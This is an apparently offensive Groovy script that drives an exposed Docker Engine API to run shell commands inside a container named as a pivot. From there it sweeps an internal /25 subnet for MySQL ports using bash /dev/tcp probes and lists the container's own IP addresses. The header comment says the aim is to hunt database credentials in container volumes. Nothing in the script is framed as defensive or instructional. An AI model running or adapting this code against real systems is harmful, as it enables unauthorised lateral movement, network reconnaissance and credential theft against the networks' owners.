// Subnet sweep 172.27.141.0/25 for MySQL ports + hunt DB creds in container volumes
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// Parallel sweep: hosts .1-.62, ports 3306 3308 3310
def sweepCmd = '''
sweep_host() {
  local h=$1
  for p in 3306 3308 3310; do
    timeout 2 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && echo "OPEN|$h|$p"
  done
}
export -f sweep_host 2>/dev/null
for i in $(seq 1 62); do
  ( sweep_host 172.27.141.$i ) &
done
wait
echo "SWEEP_141_DONE"
# quick check: our own IPs on each iface
echo "--- our source IPs ---"
cat /proc/net/fib_trie 2>/dev/null | grep -A1 "host LOCAL" | grep -oE "([0-9]+\\.){3}[0-9]+" | sort -u
'''
println "########## SUBNET SWEEP 172.27.141.0/25 (pivot02) ##########"
println execIn("5b32e909c295", sweepCmd)
